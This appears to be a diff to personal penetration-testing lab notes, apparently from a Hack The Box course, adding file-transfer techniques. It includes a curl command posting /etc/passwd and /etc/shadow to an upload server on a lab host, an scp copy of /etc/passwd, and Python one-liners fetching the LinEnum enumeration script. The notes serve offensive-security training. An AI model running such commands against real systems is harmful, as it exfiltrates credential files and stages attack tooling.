@@ -192,3 +192,25 @@ $ netstat -lnpt
 $ scp plaintext@192.168.49.128:/root/myroot.txt .
 ```
 %% use scp, it is like copy with only difference being you use your credentials and provide remote IP address or DNS name %%
+
+### Web Upload
+```
+$ sudo python3 -m pip install --user uploadserver
+$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+$ mkdir https && cd https
+$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+```
+%% whole process for uploading files %%
+
+### SCP Upload
+```
+$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
+```
+
+## Transferring files with code
+```
+$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+```
+%% transfer files with code natively if python is installed %%
